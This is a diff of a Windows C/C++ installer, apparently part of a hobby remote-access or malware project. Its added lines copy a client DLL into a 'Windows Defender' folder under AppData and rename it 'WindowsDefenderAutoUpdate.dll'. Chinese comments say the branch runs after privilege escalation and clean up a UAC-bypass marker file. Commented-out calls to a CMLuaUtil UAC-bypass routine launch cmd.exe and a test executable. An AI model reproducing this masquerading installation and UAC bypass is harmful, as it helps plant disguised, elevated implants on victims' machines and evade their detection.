@@ -53,9 +53,31 @@ int main()
 
 	// 非第一次，已提权
 	else {
+		
+		// 程序所在目录
+		WCHAR pszMuaClientDllPath[MAX_PATH];
+		GetModuleFileName(NULL, pszMuaClientDllPath, MAX_PATH);
+		WCHAR *pPos = NULL;
+		pPos = wcsrchr(pszMuaClientDllPath, '\\');
+		*pPos = NULL;
+		// 拼接成MuaClient.dll的路径（假设install.exe和MuaClient.dll位于同一目录下）
+		wcscat_s(pszMuaClientDllPath, L"\\MuaClient.dll");
+
+		WCHAR pszNewMuaClientDllPath[MAX_PATH];
+		SHGetSpecialFolderPath(NULL, pszNewMuaClientDllPath, CSIDL_APPDATA, FALSE);	// C:\Users\iyzyi\AppData\Roaming
+		wcscat_s(pszNewMuaClientDllPath, L"\\Windows Defender");
+		if (!PathIsDirectory(pszNewMuaClientDllPath)) {								// C:\Users\iyzyi\AppData\Roaming\Windows Defender 不存在则创建文件夹
+			CreateDirectory(pszNewMuaClientDllPath, NULL);
+		}
+		wcscat_s(pszNewMuaClientDllPath, L"\\WindowsDefenderAutoUpdate.dll");		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.dll
+
+		// 第三个参数表示覆盖旧文件
+		CopyFile(pszMuaClientDllPath, pszNewMuaClientDllPath, FALSE);
+
+
 
 		// install的代码
-		MessageBox(0, L"sdfsdfs", L"", 0);
+		//MessageBox(0, L"sdfsdfs", L"", 0);
 		
 		//删掉这个用于表示BypassUAC的文件
 		if (PathFileExists(pszTempPathWillBypassUAC)) {
@@ -80,6 +102,7 @@ int main()
 	//wcscat_s(szBuffer, L"\\Windows Defender\\WindowsDefenderAutoUpload.dll");
 	//MessageBox(0, szBuffer, L"", 0);
 	
+
 
 	//CMLuaUtilBypassUAC((LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
 	//CMLuaUtilBypassUAC((LPWSTR)L"C:\\Users\\iyzyi\\Desktop\\WINDOWS黑客编程技术详解-配套代码\\用户层\\5\\系统服务\\AutoRun_Service_Test\\Debug\\AutoRun_Service_Test.exe");
